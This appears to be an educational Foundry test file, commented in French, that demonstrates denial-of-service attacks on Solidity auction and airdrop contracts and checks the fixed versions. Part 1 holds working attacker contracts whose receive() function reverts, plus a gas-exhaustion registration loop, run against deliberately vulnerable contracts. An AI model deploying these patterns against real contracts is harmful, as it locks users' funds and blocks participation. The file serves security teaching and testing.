// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {VulnerableAuction} from "../src/vulnerable/VulnerableAuction.sol";
import {VulnerableAirdrop} from "../src/vulnerable/VulnerableAirdrop.sol";
import {SecureAuction} from "../src/fixed/SecureAuction.sol";
import {SecureAirdrop} from "../src/fixed/SecureAirdrop.sol";

interface IAuction {
    function bid() external payable;
}

interface IAirdrop {
    function register() external;
}

/// @dev Enchérisseur malveillant : accepte de miser, mais refuse tout remboursement.
contract RevertingBidder {
    function bid(address auction) external payable {
        IAuction(auction).bid{value: msg.value}();
    }

    receive() external payable {
        revert("Je refuse le remboursement");
    }
}

/// @dev Participant malveillant : s'inscrit, mais refuse tout ETH reçu.
contract RevertingParticipant {
    function register(address airdrop) external {
        IAirdrop(airdrop).register();
    }

    receive() external payable {
        revert("Je refuse l'ETH");
    }
}

// ---------------------------------------------------------------------------
// Partie 1 : exploitation des contrats vulnérables
// ---------------------------------------------------------------------------
contract DenialOfServiceExploitTest is Test {
    VulnerableAuction auction;
    VulnerableAirdrop airdrop;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");

    function setUp() public {
        auction = new VulnerableAuction();
        airdrop = new VulnerableAirdrop();
        vm.deal(alice, 10 ether);
        vm.deal(bob, 100 ether);
    }

    // --- Vecteur 1 : refus de remboursement (DoS with failed call) ---

    function test_Exploit_AuctionBlockedByRevertingBidder() public {
        // Alice enchérit normalement
        vm.prank(alice);
        auction.bid{value: 1 ether}();

        // L'attaquant surenchérit avec un contrat qui refuse tout remboursement
        RevertingBidder blocker = new RevertingBidder();
        vm.deal(attacker, 2 ether);
        vm.prank(attacker);
        blocker.bid{value: 2 ether}(address(auction));

        assertEq(alice.balance, 10 ether, "Alice a bien ete remboursee");
        assertEq(auction.highestBidder(), address(blocker));

        // Bob tente de surenchérir : le remboursement du contrat attaquant échoue
        vm.prank(bob);
        vm.expectRevert("Remboursement echoue");
        auction.bid{value: 3 ether}();

        assertEq(auction.highestBidder(), address(blocker), "L'attaquant reste meilleur encherisseur");
        assertEq(auction.highestBid(), 2 ether);
        assertEq(bob.balance, 100 ether, "Bob n'a rien perdu mais ne peut plus participer");
    }

    // Quel que soit le montant proposé, plus personne ne peut surenchérir
    function testFuzz_Exploit_NoOneCanOutbid(uint96 amount) public {
        vm.assume(amount > 1 ether);

        RevertingBidder blocker = new RevertingBidder();
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        blocker.bid{value: 1 ether}(address(auction));

        vm.deal(bob, amount);
        vm.prank(bob);
        vm.expectRevert("Remboursement echoue");
        auction.bid{value: amount}();
    }

    // --- Vecteur 2 : un destinataire bloque toute la distribution ---

    function test_Exploit_AirdropBlockedByRevertingParticipant() public {
        RevertingParticipant malicious = new RevertingParticipant();

        vm.prank(alice);
        airdrop.register();
        vm.prank(bob);
        airdrop.register();
        malicious.register(address(airdrop));

        vm.deal(address(this), 3 ether);
        airdrop.fund{value: 3 ether}();

        uint256 aliceBefore = alice.balance;
        uint256 bobBefore = bob.balance;

        // L'owner (ce contrat de test) ne parvient jamais à distribuer
        vm.expectRevert("Envoi echoue");
        airdrop.distribute();

        // Il peut réessayer : le résultat sera toujours le même
        vm.expectRevert("Envoi echoue");
        airdrop.distribute();

        assertEq(alice.balance, aliceBefore, "Alice n'a rien recu");
        assertEq(bob.balance, bobBefore, "Bob n'a rien recu");
        assertEq(address(airdrop).balance, 3 ether, "Les fonds restent bloques dans le contrat");
    }

    // --- Vecteur 3 : épuisement de gas (DoS with block gas limit) ---

    function test_Exploit_AirdropGasExhaustion() public {
        vm.prank(alice);
        airdrop.register();

        // L'attaquant gonfle le tableau (aucune limite, aucun dédoublonnage)
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 1_500; i++) {
            airdrop.register();
        }
        vm.stopPrank();

        vm.deal(address(this), 100 ether);
        airdrop.fund{value: 100 ether}();

        // On simule une limite de gas de 10M par transaction (plus basse que celle d'un vrai bloc)
        uint256 aliceBefore = alice.balance;
        (bool ok,) = address(airdrop).call{gas: 10_000_000}(abi.encodeCall(airdrop.distribute, ()));

        assertFalse(ok, "distribute() doit manquer de gas");
        assertEq(airdrop.participantsCount(), 1_501);
        assertEq(alice.balance, aliceBefore, "Alice n'a rien recu");
        assertEq(address(airdrop).balance, 100 ether, "Les fonds restent bloques");
    }

    // Le coût de distribute() croît avec le nombre de participants : c'est la cause racine
    function test_Exploit_AirdropGasGrowsLinearly() public {
        uint256 small = _gasToDistribute(20);
        uint256 large = _gasToDistribute(200);

        emit log_named_uint("gas distribute() avec 20 participants", small);
        emit log_named_uint("gas distribute() avec 200 participants", large);

        assertGt(large, small * 5, "Le cout doit croitre avec le nombre de participants");
    }

    function _gasToDistribute(uint256 n) internal returns (uint256 used) {
        VulnerableAirdrop a = new VulnerableAirdrop();

        vm.startPrank(attacker);
        for (uint256 i = 0; i < n; i++) {
            a.register();
        }
        vm.stopPrank();

        vm.deal(address(this), 1 ether);
        a.fund{value: 1 ether}();

        uint256 gasBefore = gasleft();
        a.distribute();
        used = gasBefore - gasleft();
    }
}

// ---------------------------------------------------------------------------
// Partie 2 : validation des contrats corrigés
// ---------------------------------------------------------------------------
contract DenialOfServiceFixedTest is Test {
    SecureAuction auction;
    SecureAirdrop airdrop;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");

    function setUp() public {
        auction = new SecureAuction();
        airdrop = new SecureAirdrop();
        vm.deal(alice, 10 ether);
        vm.deal(bob, 100 ether);
    }

    function _fund(uint256 amount) internal {
        vm.deal(address(this), amount);
        airdrop.fund{value: amount}();
    }

    // --- SecureAuction ---

    function test_Fixed_Auction_RevertingBidderCannotBlock() public {
        RevertingBidder blocker = new RevertingBidder();
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        blocker.bid{value: 1 ether}(address(auction));

        // Bob surenchérit sans problème : plus aucun envoi d'ETH pendant bid()
        vm.prank(bob);
        auction.bid{value: 2 ether}();

        assertEq(auction.highestBidder(), bob);
        assertEq(auction.highestBid(), 2 ether);
        assertEq(auction.pendingReturns(address(blocker)), 1 ether);

        // Seul l'attaquant est pénalisé : son propre retrait échoue
        vm.prank(address(blocker));
        vm.expectRevert("Transfert echoue");
        auction.withdraw();
    }

    function test_Fixed_Auction_OutbidUserWithdrawsRefund() public {
        vm.prank(alice);
        auction.bid{value: 1 ether}();
        vm.prank(bob);
        auction.bid{value: 2 ether}();

        assertEq(auction.pendingReturns(alice), 1 ether);
        assertEq(alice.balance, 9 ether);

        vm.prank(alice);
        auction.withdraw();

        assertEq(alice.balance, 10 ether, "Alice recupere sa mise");
        assertEq(auction.pendingReturns(alice), 0);
    }

    function test_Fixed_Auction_CannotWithdrawTwice() public {
        vm.prank(alice);
        auction.bid{value: 1 ether}();
        vm.prank(bob);
        auction.bid{value: 2 ether}();

        vm.startPrank(alice);
        auction.withdraw();
        vm.expectRevert("Rien a retirer");
        auction.withdraw();
        vm.stopPrank();
    }

    function test_Fixed_Auction_LowBidRejected() public {
        vm.prank(alice);
        auction.bid{value: 1 ether}();

        vm.prank(bob);
        vm.expectRevert("Offre trop basse");
        auction.bid{value: 1 ether}();
    }

    // Même avec un enchérisseur malveillant en tête, n'importe qui peut surenchérir
    function testFuzz_Fixed_Auction_AnyoneCanOutbid(uint96 amount) public {
        vm.assume(amount > 1 ether);

        RevertingBidder blocker = new RevertingBidder();
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        blocker.bid{value: 1 ether}(address(auction));

        vm.deal(bob, amount);
        vm.prank(bob);
        auction.bid{value: amount}();

        assertEq(auction.highestBidder(), bob);
    }

    // --- SecureAirdrop ---

    function test_Fixed_Airdrop_RevertingParticipantCannotBlockOthers() public {
        RevertingParticipant malicious = new RevertingParticipant();

        vm.prank(alice);
        airdrop.register();
        vm.prank(bob);
        airdrop.register();
        malicious.register(address(airdrop));

        _fund(3 ether);
        airdrop.openClaims();

        uint256 aliceBefore = alice.balance;
        uint256 bobBefore = bob.balance;

        vm.prank(alice);
        airdrop.claim();
        vm.prank(bob);
        airdrop.claim();

        assertEq(alice.balance, aliceBefore + 1 ether);
        assertEq(bob.balance, bobBefore + 1 ether);

        // Seul le participant malveillant échoue, sans impact sur les autres
        vm.prank(address(malicious));
        vm.expectRevert("Transfert echoue");
        airdrop.claim();
    }

    function test_Fixed_Airdrop_LegitParticipantsReceiveShare() public {
        vm.prank(alice);
        airdrop.register();
        vm.prank(bob);
        airdrop.register();

        _fund(10 ether);
        airdrop.openClaims();

        assertEq(airdrop.sharePerParticipant(), 5 ether);

        uint256 aliceBefore = alice.balance;
        vm.prank(alice);
        airdrop.claim();
        assertEq(alice.balance, aliceBefore + 5 ether);
        assertTrue(airdrop.claimed(alice));
    }

    function test_Fixed_Airdrop_CannotClaimTwice() public {
        vm.prank(alice);
        airdrop.register();
        vm.prank(bob);
        airdrop.register();

        _fund(10 ether);
        airdrop.openClaims();

        vm.startPrank(alice);
        airdrop.claim();
        vm.expectRevert("Deja reclame");
        airdrop.claim();
        vm.stopPrank();
    }

    function test_Fixed_Airdrop_DoubleRegistrationRejected() public {
        vm.startPrank(attacker);
        airdrop.register();
        vm.expectRevert("Deja inscrit");
        airdrop.register();
        vm.stopPrank();
    }

    function test_Fixed_Airdrop_RegistrationCap() public {
        uint256 max = airdrop.MAX_PARTICIPANTS();
        for (uint256 i = 0; i < max; i++) {
            vm.prank(address(uint160(0x10000 + i)));
            airdrop.register();
        }
        assertEq(airdrop.participantCount(), max);

        vm.prank(attacker);
        vm.expectRevert("Complet");
        airdrop.register();
    }

    // Le coût d'un claim ne dépend pas du nombre de participants (aucune boucle)
    function test_Fixed_Airdrop_ClaimGasIndependentOfParticipants() public {
        uint256 max = airdrop.MAX_PARTICIPANTS();

        vm.prank(alice);
        airdrop.register();
        for (uint256 i = 0; i < max - 1; i++) {
            vm.prank(address(uint160(0x10000 + i)));
            airdrop.register();
        }

        _fund(1_000 ether);
        airdrop.openClaims();

        vm.prank(alice);
        uint256 gasBefore = gasleft();
        airdrop.claim();
        uint256 used = gasBefore - gasleft();

        emit log_named_uint("gas claim() avec 1000 participants", used);
        assertLt(used, 100_000, "claim() doit rester peu couteux");
    }

    function test_Fixed_Airdrop_OnlyOwnerOpensClaims() public {
        vm.prank(alice);
        airdrop.register();

        vm.prank(attacker);
        vm.expectRevert("Reserve a l'owner");
        airdrop.openClaims();
    }

    // Fuzzing : la somme des parts ne dépasse jamais le montant financé
    function testFuzz_Fixed_Airdrop_SharesNeverExceedFunding(uint96 funding, uint8 n) public {
        uint256 count = bound(uint256(n), 1, 100);
        for (uint256 i = 0; i < count; i++) {
            vm.prank(address(uint160(0x20000 + i)));
            airdrop.register();
        }

        _fund(funding);
        airdrop.openClaims();

        assertLe(airdrop.sharePerParticipant() * count, funding);
    }
}

// ---------------------------------------------------------------------------
// Partie 3 : invariant (séquences aléatoires d'enchères et de retraits)
// ---------------------------------------------------------------------------
contract AuctionHandler is Test {
    SecureAuction public auction;
    address[] public actors;

    constructor(SecureAuction _auction) {
        auction = _auction;
        for (uint256 i = 0; i < 4; i++) {
            address actor = address(uint160(0xA11CE0 + i));
            actors.push(actor);
            vm.deal(actor, 10_000 ether);
        }
    }

    function actorsLength() external view returns (uint256) {
        return actors.length;
    }

    function bid(uint256 actorSeed, uint256 increment) external {
        address actor = actors[actorSeed % actors.length];
        uint256 amount = auction.highestBid() + bound(increment, 1, 1 ether);
        vm.prank(actor);
        auction.bid{value: amount}();
    }

    function withdraw(uint256 actorSeed) external {
        vm.prank(actors[actorSeed % actors.length]);
        try auction.withdraw() {} catch {}
    }
}

contract DenialOfServiceInvariantTest is Test {
    SecureAuction auction;
    AuctionHandler handler;

    function setUp() public {
        auction = new SecureAuction();
        handler = new AuctionHandler(auction);
        excludeContract(address(auction));

        bytes4[] memory selectors = new bytes4[](2);
        selectors[0] = AuctionHandler.bid.selector;
        selectors[1] = AuctionHandler.withdraw.selector;
        targetSelector(FuzzSelector({addr: address(handler), selectors: selectors}));
    }

    // Solvabilité : l'ETH détenu = meilleure offre + somme des remboursements en attente
    function invariant_AuctionBalanceMatchesAccounting() public view {
        uint256 pending;
        for (uint256 i = 0; i < handler.actorsLength(); i++) {
            pending += auction.pendingReturns(handler.actors(i));
        }
        assertEq(address(auction).balance, auction.highestBid() + pending);
    }
}
